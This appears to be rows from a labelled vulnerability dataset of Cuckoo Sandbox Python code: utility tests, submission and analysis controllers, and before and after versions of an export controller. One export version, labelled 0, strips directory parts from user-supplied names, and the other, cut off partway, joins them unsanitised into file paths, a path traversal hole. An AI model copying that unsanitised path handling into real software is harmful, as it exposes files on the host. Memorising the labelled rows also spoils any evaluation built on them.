        Folders.delete(os.path.join(self.tmp_dir, ""foo""))
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder2(self):
        """"""Tests folder deletion #2.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(self.tmp_dir, ""foo"")
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_create_temp(self):
        """"""Test creation of temporary directory.""""""
        dirpath1 = Folders.create_temp(""/tmp"")
        dirpath2 = Folders.create_temp(""/tmp"")
        assert os.path.exists(dirpath1)
        assert os.path.exists(dirpath2)
        assert dirpath1 != dirpath2

    def test_create_temp_conf(self):
        """"""Test creation of temporary directory with configuration.""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        dirpath2 = Folders.create_temp()
        assert dirpath2.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    @pytest.mark.skipif(""sys.platform != 'linux2'"")
    def test_create_invld_linux(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""/invalid/directory"")

    @pytest.mark.skipif(""sys.platform != 'win32'"")
    def test_create_invld_windows(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""Z:\\invalid\\directory"")

    def test_delete_invld(self):
        """"""Test deletion of a folder we can't access.""""""
        dirpath = tempfile.mkdtemp()

        os.chmod(dirpath, 0)
        with pytest.raises(CuckooOperationalError):
            Folders.delete(dirpath)

        os.chmod(dirpath, 0775)
        Folders.delete(dirpath)

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""a"")
        Folders.create((dirpath, ""a""), ""b"")
        Files.create((dirpath, ""a"", ""b""), ""c.txt"", ""nested"")

        filepath = os.path.join(dirpath, ""a"", ""b"", ""c.txt"")
        assert open(filepath, ""rb"").read() == ""nested""

class TestCreateFile:
    def test_temp_file(self):
        filepath1 = Files.temp_put(""hello"", ""/tmp"")
        filepath2 = Files.temp_put(""hello"", ""/tmp"")
        assert open(filepath1, ""rb"").read() == ""hello""
        assert open(filepath2, ""rb"").read() == ""hello""
        assert filepath1 != filepath2

    def test_create(self):
        dirpath = tempfile.mkdtemp()
        Files.create(dirpath, ""a.txt"", ""foo"")
        assert open(os.path.join(dirpath, ""a.txt""), ""rb"").read() == ""foo""
        shutil.rmtree(dirpath)

    def test_named_temp(self):
        filepath = Files.temp_named_put(""test"", ""hello.txt"", ""/tmp"")
        assert open(filepath, ""rb"").read() == ""test""
        assert os.path.basename(filepath) == ""hello.txt""

    def test_temp_conf(self):
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        filepath = Files.temp_put(""foo"")
        assert filepath.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    def test_stringio(self):
        filepath = Files.temp_put(cStringIO.StringIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_bytesio(self):
        filepath = Files.temp_put(io.BytesIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_create_bytesio(self):
        dirpath = tempfile.mkdtemp()
        filepath = Files.create(dirpath, ""a.txt"", io.BytesIO(""A""*1024*1024))
        assert open(filepath, ""rb"").read() == ""A""*1024*1024

    def test_hash_file(self):
        filepath = Files.temp_put(""hehe"", ""/tmp"")
        assert Files.md5_file(filepath) == ""529ca8050a00180790cf88b63468826a""
        assert Files.sha1_file(filepath) == ""42525bb6d3b0dc06bb78ae548733e8fbb55446b3""
        assert Files.sha256_file(filepath) == ""0ebe2eca800cf7bd9d9d9f9f4aafbc0c77ae155f43bbbeca69cb256a24c7f9bb""

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""foo"")
        Files.create((dirpath, ""foo""), ""a.txt"", ""bar"")

        filepath = os.path.join(dirpath, ""foo"", ""a.txt"")
        assert open(filepath, ""rb"").read() == ""bar""

    def test_fd_exhaustion(self):
        fd, filepath = tempfile.mkstemp()

        for x in xrange(0x100):
            Files.temp_put(""foo"")

        fd2, filepath = tempfile.mkstemp()

        # Let's leave a bit of working space.
        assert fd2 - fd < 64

class TestStorage:
    def test_basename(self):
        assert Storage.get_filename_from_path(""C:\\a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:\\\x00a.txt"") == ""\x00a.txt""
        assert Storage.get_filename_from_path(""/tmp/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""../../b.txt"") == ""b.txt""
        assert Storage.get_filename_from_path(""..\\..\\c.txt"") == ""c.txt""

class TestConvertChar:
    def test_utf(self):
        assert ""\\xe9"", utils.convert_char(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_char(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_char(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_char(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_char("" "")

class TestConvertToPrintable:
    def test_utf(self):
        assert ""\\xe9"" == utils.convert_to_printable(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_to_printable(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_to_printable(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_to_printable(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_to_printable("" "")

    def test_non_printable(self):
        assert r""\x0b"" == utils.convert_to_printable(chr(11))

class TestIsPrintable:
    def test_utf(self):
        assert not utils.is_printable(u""\xe9"")

    def test_digit(self):
        assert utils.is_printable(u""9"")

    def test_literal(self):
        assert utils.is_printable(""e"")

    def test_punctation(self):
        assert utils.is_printable(""."")

    def test_whitespace(self):
        assert utils.is_printable("" "")

    def test_non_printable(self):
        assert not utils.is_printable(chr(11))

def test_version():
    from cuckoo import __version__
    from cuckoo.misc import version
    assert __version__ == version

def test_exception():
    s = utils.exception_message()
    assert ""Cuckoo version: %s"" % cuckoo.__version__ in s
    assert ""alembic:"" in s
    assert ""django-extensions:"" in s
    assert ""peepdf:"" in s
    assert ""sflock:"" in s

def test_guid():
    assert utils.guid_name(""{0002e005-0000-0000-c000-000000000046}"") == ""InprocServer32""
    assert utils.guid_name(""{13709620-c279-11ce-a49e-444553540000}"") == ""Shell""

def test_jsbeautify():
    js = {
        ""if(1){a(1,2,3);}"": ""if (1) {\n    a(1, 2, 3);\n}"",
    }
    for k, v in js.items():
        assert utils.jsbeautify(k) == v

@mock.patch(""cuckoo.common.utils.jsbeautifier"")
def test_jsbeautify_packer(p, capsys):
    def beautify(s):
        print u""error: Unknown p.a.c.k.e.r. encoding.\n"",

    p.beautify.side_effect = beautify
    utils.jsbeautify(""thisisjavascript"")
    out, err = capsys.readouterr()
    assert not out and not err

def test_htmlprettify():
    html = {
        ""<a href=google.com>wow</a>"": '<a href=""google.com"">\n wow\n</a>',
    }
    for k, v in html.items():
        assert utils.htmlprettify(k) == v

def test_temppath():
    dirpath = tempfile.mkdtemp()
    set_cwd(dirpath)
    Folders.create(dirpath, ""conf"")

    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = ""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /tmp""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /custom/directory""
    )
    assert temppath() == ""/custom/directory""

def test_bool():
    assert utils.parse_bool(""true"") is True
    assert utils.parse_bool(""True"") is True
    assert utils.parse_bool(""yes"") is True
    assert utils.parse_bool(""on"") is True
    assert utils.parse_bool(""1"") is True

    assert utils.parse_bool(""false"") is False
    assert utils.parse_bool(""False"") is False
    assert utils.parse_bool(""None"") is False
    assert utils.parse_bool(""no"") is False
    assert utils.parse_bool(""off"") is False
    assert utils.parse_bool(""0"") is False

    assert utils.parse_bool(""2"") is True
    assert utils.parse_bool(""3"") is True

    assert utils.parse_bool(True) is True
    assert utils.parse_bool(1) is True
    assert utils.parse_bool(2) is True
    assert utils.parse_bool(False) is False
    assert utils.parse_bool(0) is False

def test_supported_version():
    assert utils.supported_version(""2.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.0"") is True

    assert utils.supported_version(""2.0.1a1"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.1a1"", ""2.0.1a0"", ""2.0.1b1"") is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1"", None) is False
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", None) is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", ""2.0.1"") is True

def test_validate_url():
    assert utils.validate_url(""http://google.com/"")
    assert utils.validate_url(""google.com"")
    assert utils.validate_url(""google.com/test"")
    assert utils.validate_url(""https://google.com/"")
    assert not utils.validate_url(""ftp://google.com/"")
/n/n/n",0
45,168cabf86730d56b7fa319278bf0f0034052666a,"/cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, data[""data""])
                filedata = open(filepath, ""rb"").read()

                unpacked = sflock.unpack(
                    filepath=filename, contents=filedata,
                    password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree()

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return {
            ""files"": files,
            ""path"": submit.tmp_path,
        }

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""per_file_options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/n/cuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING
from cuckoo.common.mongo import mongo

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")
        data = {}

        task = db.view_task(task_id, details=True)
        if task:
            entry = task.to_dict()
            entry[""guest""] = {}
            if task.guest:
                entry[""guest""] = task.guest.to_dict()

            entry[""errors""] = []
            for error in task.errors:
                entry[""errors""].append(error.message)

            entry[""sample""] = {}
            if task.sample_id:
                sample = db.view_sample(task.sample_id)
                entry[""sample""] = sample.to_dict()

            data[""task""] = entry
        else:
            return Exception(""Task not found"")

        return data

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/n/cuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        data = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""data"": data,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/n",1
46,b90267fe4e5ee266ec3d4310a7b5c92c805b7ea3,"cuckoo/web/controllers/analysis/export/export.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import io
import os
import json
import zipfile

from django.template.defaultfilters import filesizeformat

from cuckoo.common.utils import json_default
from cuckoo.web.controllers.analysis.analysis import AnalysisController
from cuckoo.web.utils import get_directory_size

class ExportController:
    """"""Class for creating task exports""""""
    @staticmethod
    def estimate_size(task_id, taken_dirs, taken_files):
        report = AnalysisController.get_report(task_id)
        report = report[""analysis""]
        path = report[""info""][""analysis_path""]

        size_total = 0

        for directory in taken_dirs:
            destination = ""%s/%s"" % (path, os.path.basename(directory))
            if os.path.isdir(destination):
                size_total += get_directory_size(destination)

        for filename in taken_files:
            destination = ""%s/%s"" % (path, os.path.basename(filename))
            if os.path.isfile(destination):
                size_total += os.path.getsize(destination)

        # estimate file size after zipping; 60% compression rate typically
        size_estimated = size_total / 6.5

        return {
            ""size"": int(size_estimated),
            ""size_human"": filesizeformat(size_estimated)
        }

    @staticmethod
    def create(task_id, taken_dirs, taken_files, report=None):
        """"""
        Returns a zip file as a file like object.
        :param task_id: task id
        :param taken_dirs: directories to include
        :param taken_files: files to include
        :param report: additional report dict
        :return: zip file
        """"""
        if not taken_dirs and not taken_files:
            raise Exception(
                ""Please select at least one directory or file to be exported.""
            )

        # @TO-DO: refactor
        taken_dirs_tmp = []
        for taken_dir in taken_dirs:
            if isinstance(taken_dir, tuple):
                taken_dirs_tmp.append(taken_dir[0])
            else:
                taken_dirs_tmp.append(taken_dir)

        taken_dirs = taken_dirs_tmp

        if not report:
            report = AnalysisController.get_report(task_id)

        report = report[""analysis""]
        path = report[""info""][""analysis_path""]

        f = io.BytesIO()
        z = zipfile.ZipFile(f, ""w"", zipfile.ZIP_DEFLATED, allowZip64=True)

        for dirpath, dirnames, filenames in os.walk(path):
            if os.path.basename(dirpath) == task_id:
                for filename in filenames:
                    if filename in taken_files:
                        z.write(os.path.join(dirpath, filename), filename)
            if os.path.basename(dirpath) in taken_dirs:
                for filename in filenames:
                    z.write(
                        os.path.join(dirpath, filename),
                        os.path.join(os.path.basename(dirpath), filename)
                    )

        # Creating an analysis.json file with additional information about this
        # analysis. This information serves as metadata when importing a task.
        obj = {
            ""action"": report.get(""debug"", {}).get(""action"", []),
            ""errors"": report.get(""debug"", {}).get(""errors"", []),
        }
        z.writestr(
            ""analysis.json"", json.dumps(obj, indent=4, default=json_default)
        )

        z.close()
        return f

    @staticmethod
    def get_files(analysis_path):
        """"""Locate all directories/results available for this analysis""""""
        if not os.path.exists(analysis_path):
            raise Exception(""Analysis path not found: %s"" % analysis_path)

        dirs, files = [], []
        for filename in os.listdir(analysis_path):
            path = os.path.join(analysis_path, filename)
            if os.path.isdir(path):
                dirs.append((filename, len(os.listdir(path))))
            else:
                files.append(filename)

        return dirs, files
/n/n/n",0
47,b90267fe4e5ee266ec3d4310a7b5c92c805b7ea3,"/cuckoo/web/controllers/analysis/export/export.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import io
import os
import json
import zipfile

from django.template.defaultfilters import filesizeformat

from cuckoo.common.utils import json_default
from cuckoo.web.controllers.analysis.analysis import AnalysisController
from cuckoo.web.utils import get_directory_size

class ExportController:
    """"""Class for creating task exports""""""
    @staticmethod
    def estimate_size(task_id, taken_dirs, taken_files):
        report = AnalysisController.get_report(task_id)
        report = report[""analysis""]
        path = report[""info""][""analysis_path""]

        size_total = 0

        for directory in taken_dirs:
            destination = ""%s/%s"" % (path, directory)
            if os.path.isdir(destination):
                size_total += get_directory_size(destination)

        for filename in taken_files:
            destination = ""%s/%s"" % (path, filename)
            if os.path.isfile(destination):
                size_total += os.path.getsize(destination)

        # estimate file size after zipping; 60% compression rate typically
        size_estimated = size_total / 6.5

        return {
            ""size"": int(size_estimated),
            ""size_human"": filesizeformat(size_estimated)
        }

    @staticmethod
    def create(task_id, taken_dirs, taken_files, report=None):
        """"""
        Returns a zip file as a file like object.
        :param task_id: task id
        :param taken_dirs: directories to include
        :param taken_files: files to include
        :param report: additional report dict
        :return: zip file
        """"""
        if not taken_dirs and not taken_files:
            raise Exception(
                ""Please select at least one directory or file to be exported.""
            )

        # @TO-DO: refactor
        taken_dirs_tmp = []
        for taken_dir in taken_dirs:
            if isinstance(taken_dir, tuple):
                taken_dirs_tmp.append(taken_dir[0])
            else:
                taken_dirs_tmp.append(taken_dir)

        taken_dirs = taken_dirs_tmp

        if not report:
            report = AnalysisController.get_report(task_id)

        report = report[""analysis""]
        path = report[""info""][""analysis_path""]

        f = io.BytesIO()
        z = zipfile.ZipFile(f, ""w"", zipfile.ZIP_DEFLATED, allowZip64=True)

        for dirpath, dirnames, filenames in os.walk(path):
            if os.path.basename(dirpath) == task_id:
                for filename in filenames:
                    if filename in taken_files:
                        z.write(os.path.join(dirpath, filename), filename)
            if os.path.basename(dirpath) in taken_dirs:
                for filename in filenames:
                    z.write(
                        os.path.join(dirpath, filename),
                        os.path.join(os.path.basename(dirpath), filename)
                    )

        # Creating an analysis.json file with additional information about this
        # analysis. This information serves as metadata when importing a task.
        obj = {
            ""action"": report.get(""debug"", {}).get(""action"", []),
            ""errors"": report.get(""debug"", {}).get(""errors"", []),
        }
        z.writestr(
            ""analysis.json"", json.dumps(obj, indent=4, default=json_default)
        )

        z.close()
        return f

    @staticmethod
    def get_files(analysis_path):
